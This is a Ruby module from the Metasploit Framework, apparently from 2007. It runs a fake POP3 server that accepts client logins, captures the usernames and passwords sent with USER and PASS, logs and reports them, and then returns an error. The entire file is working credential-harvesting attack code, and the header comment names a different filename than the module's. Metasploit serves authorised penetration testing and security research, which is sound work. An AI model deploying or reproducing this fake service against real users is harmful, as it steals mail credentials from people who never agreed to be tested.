##
# $Id: socks_unc.rb 5069 2007-08-08 02:46:31Z hdm $
##

##
# This file is part of the Metasploit Framework and may be subject to 
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/projects/Framework/
##


require 'msf/core'

module Msf

class Auxiliary::Server::Capture::Pop3 < Msf::Auxiliary

	include Exploit::Remote::TcpServer
	include Auxiliary::Report

	
	def initialize
		super(
			'Name'        => 'Authentication Capture: POP3',
			'Version'     => '$Revision: 5069 $',
			'Description'    => %q{
				This module provides a fake POP3 service that
			is designed to capture authentication credentials.
			},
			'Author'      => ['ddz', 'hdm'],
			'License'     => MSF_LICENSE,
			'Actions'     =>
				[
				 	[ 'Capture' ]
				],
			'PassiveActions' => 
				[
					'Capture'
				],
			'DefaultAction'  => 'Capture'
		)

		register_options(
			[
				OptPort.new('SRVPORT',    [ true, "The local port to listen on.", 110 ])
			], self.class)
	end

	def setup
		super
		@state = {}
	end

	def run
		exploit()
	end
	
	def on_client_connect(c)
		@state[c] = {:name => "#{c.peerhost}:#{c.peerport}", :ip => c.peerhost, :port => c.peerport, :user => nil, :pass => nil}
		c.put "+OK\r\n"
	end
	
	def on_client_data(c)
		data = c.get_once
		return if not data
		cmd,arg = data.strip.split(/\s+/, 2)
		arg ||= ""
		
		if(cmd.upcase == "USER")
			@state[c][:user] = arg
			c.put "+OK\r\n"
			return
		end

		if(cmd.upcase == "PASS")
			@state[c][:pass] = arg
			
			report_auth_info(
				:host      => @state[c][:ip],
				:proto     => 'pop3',
				:targ_host => datastore['SRVHOST'],
				:targ_port => datastore['SRVPORT'],
				:user      => @state[c][:user],
				:pass      => @state[c][:pass]
			)
			print_status("POP3 LOGIN #{@state[c][:name]} #{@state[c][:user]} / #{@state[c][:pass]}")
		end

		@state[c][:pass] = data.strip
		c.put "-ERR\r\n"
		return
							
	end
	
	def on_client_close(c)
		@state.delete(c)
	end


end
end
